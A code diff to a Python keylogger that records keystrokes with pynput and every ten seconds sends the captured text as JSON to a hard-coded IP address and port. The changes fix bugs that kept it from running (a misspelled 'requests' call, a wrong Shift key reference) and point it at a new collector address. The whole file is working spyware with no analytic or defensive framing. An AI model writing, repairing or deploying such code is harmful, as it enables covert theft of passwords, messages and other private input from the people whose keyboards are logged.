@@ -1,14 +1,14 @@
-from pynput import keyboard
+from pynput import mouse,keyboard
 
-import requests 
+import requests
 
 import json
 import threading
 
 text= ""
 
-ip_address= "192.168.32.5"  //change_this
-port_number= 8808           //change_this 
+ip_address= "192.168.80.48"  
+port_number= 8080           
 
 time_interval = 10
 
@@ -17,7 +17,7 @@ def send_post_req():
     try:
         payload= json.dumps({"keyboardData": text})
 
-        r = request.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type": "application/json"})
+        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type": "application/json"})
         timer = threading.Timer(time_interval, send_post_req)
         timer.start()
 
@@ -34,7 +34,7 @@ def on_press(key):
         text+= "\t"
     elif key == keyboard.Key.space:
         text+= " "
-    elif key == keyboard.shift:
+    elif key == keyboard.Key.shift:
         pass
     elif key == keyboard.Key.backspace and len(text) == 0:
         pass
